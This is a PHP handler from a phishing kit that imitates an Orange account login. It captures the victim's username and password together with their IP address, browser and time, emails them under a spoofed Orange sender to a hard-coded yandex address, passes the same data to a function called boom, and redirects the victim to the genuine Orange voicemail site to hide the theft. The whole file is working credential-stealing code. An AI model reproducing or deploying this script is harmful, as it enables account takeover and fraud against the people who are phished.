<?php

 require_once "function.php";

      include "config.php";
	  
// EMAIL
$EMAIL = "asapoff007@yandex.com";
// EMAIL


$ip = getenv("REMOTE_ADDR");
$userAgent = getenv( 'HTTP_USER_AGENT' );
$date = date('m/d/Y h:i:s a', time());






// // echo  $_POST['Passwd'] ; 
// // echo "\n";
// echo $SESSION['username'];

if(isset($_POST['Passwd'])){
  session_start(); 
  $user = $_SESSION['username'];
  $Passwd = $_POST['Passwd'];
    $message .= "
   
[Orange New-LOGIN]
[username]  = $user
[password ] = $Passwd 
[By RODONDO ]
[System]
[IP  ] = $ip
[TIME/DATE] = $date
[BROWSER] = $userAgent
";

$subject = "LOGIN-ORANGE :  [ $ip ]";
$HEA .= "From:ORANGE <orange@naturetecthnologie.com>";
@mail($EMAIL, $subject, $message, $HEA);
   
      // echo $message ;                                 
   boom($message);
    header('Location: https://boitevocale5w.orange.fr');
 exit;
    
  
}






?>
